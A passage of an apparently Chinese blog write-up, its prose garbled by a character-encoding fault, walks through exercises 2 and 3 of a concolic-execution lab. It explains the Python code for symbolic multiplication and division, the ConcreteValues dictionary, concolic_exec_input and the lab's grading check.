v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>



<hr>
<p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼šé€šè¿‡å¢åŠ æ•´å‹ä¹˜æ³•ä¸é™¤æ³•æ”¯æŒæ¥å®Œæˆå¯¹ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_int</code> çš„å®ç°ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½é¢å¤–çš„æ–¹æ³•å¹¶ä¸ºä¹˜é™¤æ³•è¿ç®—æ·»åŠ  AST èŠ‚ç‚¹ï¼Œå¹¶ä¸ºè¿™äº› AST èŠ‚ç‚¹åº”ç”¨ <code>_z3expr</code></p>
<blockquote>
<p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p>
<p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p>
<p>Run <strong>.&#x2F;check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p>
</blockquote>
<p>æˆ‘ä»¬é¦–å…ˆå®ç°ç¬¦å·å˜é‡ä¹˜é™¤æ‰€éœ€çš„ <code>sym_binop</code> å­ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å‚ç…§å‰é¢çš„åŠ å‡è¿ç®—ç›´æ¥è°ƒç”¨ <code>z3expr()</code> æ¥è¿”å› Z3 è¡¨è¾¾å¼å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶ python çš„é™¤æ³•è¿ç®—æœ‰ <code>/</code> ä¸ <code>//</code>ä¸¤ç§ï¼Œä½†æ˜¯ Z3å¹¶ä¸æ”¯æŒ <code>ArithRef</code> ä¸ <code>int</code> ç›´æ¥è¿›è¡Œ <code>//</code> è¿ç®—ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªå®ç°ä¸€ä¸ªæ™®é€šçš„ä¹˜æ³•å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡å†™ <code>concolic_int</code> çš„ä¹˜æ³•ä¸é™¤æ³•ï¼Œæˆ‘ä»¬å…ˆå‚è€ƒä¸€ä¸‹ <code>concolic_int </code>ä¸­çš„åŠ æ³•è¿ç®—æ–¹å¼ï¼šã€</p>
<ul>
<li>é¦–å…ˆåˆ¤æ–­è¿ç®—å¯¹è±¡æ˜¯å¦ä¸º <code>concolic_int</code> ï¼Œè‹¥æ˜¯åˆ™å°†è‡ªèº«å…·ä½“å€¼åŠ ä¸Šå¯¹è±¡å…·ä½“å€¼ï¼Œå¦åˆ™ç›´æ¥åŠ ä¸Šè¯¥å¯¹è±¡ï¼Œç»“æœå­˜æ”¾åˆ° <code>res</code></li>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>concolic_int</code> å®ä¾‹ä½œä¸ºè¿”å›å€¼ï¼Œ<code>res</code> ä½œä¸ºå…¶å…·ä½“å€¼éƒ¨åˆ†ï¼Œåˆ›å»ºä¸¤ä¸ª <code>ast</code> å®ä¾‹å¹¶åˆ©ç”¨ <code>sym_plus()</code> è®¡ç®—ç»“æœä½œä¸ºæ–° concolic_int çš„ç¬¦å·å€¼éƒ¨åˆ†</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬çš„ä¹˜é™¤æ³•å…¶å®ä¾è‘«èŠ¦ç”»ç“¢å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦åŒæ—¶å®ç° <code>/</code> ä¸ <code>//</code> ä¸¤ç§é™¤æ³•è¿ç®—ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 2ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç„¶åæ˜¯ Exercise 3ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬ç†Ÿæ‚‰æ··åˆæ‰§è¡Œç³»ç»Ÿçš„ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæä¾›çš„é€”å¾„æ˜¯ä¿®æ”¹ <code>symex_exercises.py</code> ä»¥ç»™äºˆæµ‹è¯•ç³»ç»Ÿæ­£ç¡®çš„è¾“å…¥ï¼š</p>
<blockquote>
<p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Donâ€™t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p>
</blockquote>
<p>æ··åˆæ‰§è¡Œæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ä¾¿æ˜¯ <code>symex/fuzzy.py</code>  ä¸­çš„  <code>concolic_exec_input()</code> ï¼Œé¢˜ç›®è¯´åç»­æˆ‘ä»¬å°†ç”¨å…¶å®ç°ä¸€ä¸ªå®Œæ•´çš„æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬å…ˆæ¥çœ‹å…¶ç›¸å…³çš„å…·ä½“å®ç°</p>
<h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2</h3><h4 id="VI-å…·ä½“å€¼å­—å…¸-ConcreteValues"><a href="#VI-å…·ä½“å€¼å­—å…¸-ConcreteValues" class="headerlink" title="VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues"></a>VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues</h4><p>å¦‚å‰æ–‡æ‰€è¨€ï¼Œåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å­—å…¸ä¸­ï¼Œå®ä¸ºä¸€ä¸ª<code>ConctreteValues</code> ç±»å¯¹è±¡ï¼Œå®é™…ä¸Šå°±æ˜¯ python å­—å…¸çš„ä¸€ä¸ª wrapper</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>symex/fuzzy.py</code> ä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ <code>current_concrete_values</code>ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€è¯´çš„å…¨å±€å…·ä½“å€¼å­—å…¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>ConctreteValues.mk_global()</code> ä½¿è¯¥å¯¹è±¡å˜ä¸ºå…¨å±€å¼•ç”¨ï¼Œå³æˆ‘ä»¬æ¯æ¬¡ä½¿ç”¨åªéœ€è¦åˆ›å»ºä¸€ä¸ª<code>ConctreteValues</code> å¯¹è±¡å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure>

<p>åœ¨è¯¥ç±»ä¸­æœ‰ä¸‰ä¸ªæŸ¥è¯¢å­—å…¸å†… id å¯¹åº”å…·ä½“å€¼å¹¶è¿”å›æ··åˆå€¼çš„å‡½æ•°ï¼Œè‹¥ id ä¸åœ¨å­—å…¸å†…åˆ™è¿›è¡Œæ·»åŠ ï¼ŒåŒæ—¶åœ¨ <code>symex/fuzzy.py</code> ä¸­å¸¦æœ‰ä¸‰ä¸ªå¯¹è¿™äº›å‡½æ•°çš„ wrapperï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure>

<p>é™¤äº†ä¸Šé¢çš„å‡½æ•°ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>add()</code> æˆå‘˜å‡½æ•°æ¥å‘å­—å…¸å†…æ·»åŠ æ˜ å°„ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure>

<p>ä»¥åŠè¿˜æœ‰ä¸€ä¸ª <code>canonical_rep()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥è¿”å›å­—å…¸ä¸­çš„é”®å€¼å¯¹å…ƒç»„æ’åºåˆ—è¡¨ï¼Œä»¥åŠ <code>var_names()</code> ç”¨ä»¥è¿”å› id åˆ—è¡¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure>

<p>ä»¥åŠä¸€ä¸ª <code>inherit()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥ä»å¦ä¸€ä¸ªå­—å…¸ä¸­æ‹·è´é”®å€¼å¯¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure>



<h4 id="VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ"><a href="#VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ" class="headerlink" title="VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ"></a>VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ</h4><p>è¯¥å‡½æ•°å†…å®¹ç”¨ä»¥æ ¹æ®ç»™äºˆçš„å­—å…¸å¯¹ä¼ å…¥çš„å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œæ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p>
<ul>
<li>åˆå§‹åŒ–ä¸¤ä¸ªå…¨å±€ç©ºåˆ—è¡¨ <code>cur_path_constr</code> ï¼ˆ<strong>å½“å‰è·¯å¾„çš„æ¡ä»¶çº¦æŸ</strong>ï¼‰ä¸ <code>cur_path_constr_callers</code>ï¼ˆå½“å‰è·¯å¾„çš„ä¿¡æ¯ï¼‰</li>
<li>è°ƒç”¨ <code>concrete_values.mk_global()</code> ä½¿å…¶æˆä¸ºä¸€ä¸ªå…¨å±€å­—å…¸</li>
<li>è°ƒç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥è·å¾—ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè‹¥å‚æ•° <code>verbose &gt; 1</code> åˆ™æ‰“å°ä¸¤ä¸ªåˆ—è¡¨çš„å†…å®¹</li>
<li>æœ€åçš„è¿”å›å€¼ä¸º <code>(v, cur_path_constr, cur_path_constr_callers)</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å¹¶æ²¡æœ‰æ›´æ”¹è·¯å¾„çº¦æŸä¸ä¿¡æ¯çš„åˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™åœ¨ <code>add_constr()</code> ä¸­å®Œæˆï¼Œè¯¥å‡½æ•°åœ¨ <code>concolic_bool()</code> ä¸­è°ƒç”¨ï¼Œå°†çº¦æŸä¿¡æ¯è¿›è¡Œæ·»åŠ ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure>

<p>è€Œ <code>concolic_bool()</code> å®é™…ä¸Šåœ¨ <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„è¿ç®—ç¬¦é‡è½½ä¸­è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ¯æ¬¡æ‰§è¡Œ <code>concolic_exec_input()</code> éƒ½è¦<strong>é‡æ–°å°†è·¯å¾„çº¦æŸä¸ä¿¡æ¯åˆ—è¡¨æ¸…ç©º</strong>çš„ç¼˜æ•…ï¼Œè¿™é‡Œä»¥ <code>concolic_int </code>ä¸­çš„ <code>__cmp__</code> è¿ç®—ç¬¦ä¸ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>



<hr>
<p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>symex_exercises.py</code>  é‡Œæœ‰å•¥ï¼Œä¸»è¦å°±ä¸€ä¸ª <code>make_a_test()</code> å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­å®Œæˆå…¨å±€å…·ä½“å€¼å­—å…¸ <code>concrete_values</code> çš„æ„å»ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹   <code>symex_exercises.py</code> ä¸­åˆ›å»ºçš„å­—å…¸å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ Exercise 3 çš„è¯„åˆ¤æ ‡å‡†ï¼Œåœ¨ <code>check_lab3.py</code> ä¸­æ£€æµ‹çš„æ˜¯è¿è¡Œ <code>check-symex-int.py</code> åè¦è¾“å‡º <code>&quot;Found input for 1234&quot;</code> å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure>

